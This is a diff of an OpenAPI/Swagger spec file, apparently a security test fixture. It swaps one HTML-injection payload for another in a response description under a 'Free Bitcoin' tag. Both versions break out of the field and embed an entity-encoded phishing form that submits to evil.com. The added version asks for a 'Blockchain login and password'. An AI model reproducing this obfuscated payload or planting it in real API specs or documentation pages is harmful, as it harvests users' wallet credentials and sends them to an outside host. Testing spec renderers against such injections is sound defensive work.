@@ -9,7 +9,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><p>&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x70;&#x65;&#x72;&#x73;&#x6f;&#x6e;&#x61;&#x6c;&#x20;&#x64;&#x61;&#x74;&#x61;&#x3a;<form action='https://evil.com'><input type='text'><input type='submit' value='Send'><!--
+          description: No response was specified'">&#x3c;&#x66;&#x6f;&#x72;&#x6d;&#x20;&#x61;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x20;&#x6d;&#x65;&#x74;&#x68;&#x6f;&#x64;&#x3d;&#x22;&#x47;&#x45;&#x54;&#x22;&#x3e;&#x3c;&#x6c;&#x61;&#x62;&#x65;&#x6c;&#x3e;&#x45;&#x6e;&#x74;&#x65;&#x72;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x42;&#x6c;&#x6f;&#x63;&#x6b;&#x63;&#x68;&#x61;&#x69;&#x6e;&#x20;&#x6c;&#x6f;&#x67;&#x69;&#x6e;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x3a;&#x3c;&#x70;&#x3e;&#x3c;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x74;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x22;&#x3e;&#x3c;&#x70;&#x3e;&#x3c;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x74;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x73;&#x75;&#x62;&#x6d;&#x69;&#x74;&#x22;&#x3e;
       tags:
         - Free Bitcoin
       operationId: findAccounts
